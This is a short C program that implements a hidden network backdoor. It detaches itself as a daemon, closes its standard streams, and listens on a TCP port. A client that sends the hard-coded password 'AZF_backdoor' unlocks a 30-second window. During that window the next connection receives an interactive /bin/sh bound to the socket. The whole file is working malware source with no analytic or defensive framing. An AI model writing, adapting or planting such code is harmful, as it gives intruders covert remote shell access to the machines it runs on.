#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>

#define SECRET "AZF_backdoor"
#define TIMEOUT 30

static time_t unlock = 0;

int main(int argc, char **argv) {
     int port = (argc >= 2) ? atoi(argv[1]) : 43459;
     if (port <= 0 || port > 65535) return 1;

     /* Devenir daemon */
     if (fork()) exit(0);
     setsid();
     signal(SIGHUP, SIG_IGN);
     if (fork()) exit(0);
     chdir("/");
     close(0); close(1); close(2);

     int s = socket(AF_INET, SOCK_STREAM, 0);
     if (s < 0) return 1;

     int opt = 1;
     setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

     struct sockaddr_in addr = {0};
     addr.sin_family = AF_INET;
     addr.sin_addr.s_addr = 0;
     addr.sin_port = htons(port);

     if (bind(s, (struct sockaddr*)&addr, sizeof(addr)) < 0) return 1;
     if (listen(s, 5) < 0) return 1;

     for (;;) {
          int fd = accept(s, NULL, NULL);
          if (fd < 0) continue;

          time_t now = time(NULL);
          
          if (unlock > 0 && now <= unlock) {
               unlock = 0;
               if (fork() == 0) {
                    dup2(fd, 0);
                    dup2(fd, 1);
                    dup2(fd, 2);
                    execl("/bin/sh", "sh", NULL);
                    exit(0);
               }
          } else {
               char buf[256];
               ssize_t n = read(fd, buf, sizeof(buf) - 1);
               if (n > 0) {
                    buf[n] = '\0';
                    char *p = buf;
                    while (*p && (*p == '\n' || *p == '\r')) p++;
                    char *e = p;
                    while (*e && *e != '\n' && *e != '\r') e++;
                    *e = '\0';
                    if (strcmp(p, SECRET) == 0) unlock = now + TIMEOUT;
               }
          }
          close(fd);
     }
     return 0;
}